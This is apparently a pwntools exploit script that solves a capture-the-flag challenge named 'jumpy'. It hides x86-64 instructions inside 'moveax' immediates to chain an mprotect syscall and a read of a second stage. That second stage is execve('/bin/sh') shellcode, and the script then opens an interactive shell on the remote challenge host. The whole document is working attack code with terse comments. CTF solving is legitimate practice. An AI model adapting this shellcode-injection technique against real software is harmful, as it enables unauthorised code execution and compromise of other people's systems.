from pwn import *
import sys
context.arch = 'amd64'

if sys.argv[1] == "r":
    p = remote("7b0000000cf58aaf1ba68307-jumpy.challenge.master.allesctf.net", 31337, ssl=True)

elif sys.argv[1] == "l":
    p = process("./jumpy")
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, gdbscript='''
                            pie b *0x16c0
                            continue
                            ''')

                            
def create_ret():
    p.sendlineafter("> ", "ret")

def create_moveax(imm32):
    p.sendlineafter("> ", "moveax " + str(imm32))

def create_jmp(imm8):
    p.sendlineafter("> ", "jmp")
    p.sendline(str(imm8))

def solve():
    create_jmp(0x1)
    # call mprotect to get write permission
    create_moveax(0xb09000eb)
    create_moveax(0xb0905f51)   # pop rcx, push rdi => rdi = 0x1337000000
    create_moveax(0xb05e006a)   # push 0, pop rsi   
    create_moveax(0xb0be6690)   # mov si, 0xb8b0    => rsi = 0xb8b0
    create_moveax(0xb09007b2)   # mov dl, 0x7       => rdx = 7
    create_moveax(0xb190ae2c)   # sub al, 0xae      => eax = 10
    create_moveax(0xb190050f)   # syscall
    
    # write shellcode 
    create_moveax(0xb0905e57)   # push rdi, pop rsi     => rsi = 0x1337000000
    create_moveax(0xb05f006a)   # push 0, pop rdi       => rdi = 0
    create_moveax(0xb05a7f6a)   # push 0x7f, pop rdx    => rdx = 0x7f
    create_moveax(0xb158006a)   # push 0, pop rax          => rax = 0x0
    create_moveax(0xb190050f)   # syscall

    shellcode = asm('''
                xor rsi,rsi
                push rsi
                mov rdi,0x68732f2f6e69622f
                push rdi
                push rsp
                pop rdi
                push 59
                pop rax
                cdq
                syscall
        ''')  
    p.sendlineafter("> ", "c")
    p.sendline("A"*0x3c + shellcode)
    p.interactive()

if __name__ == "__main__":
    solve()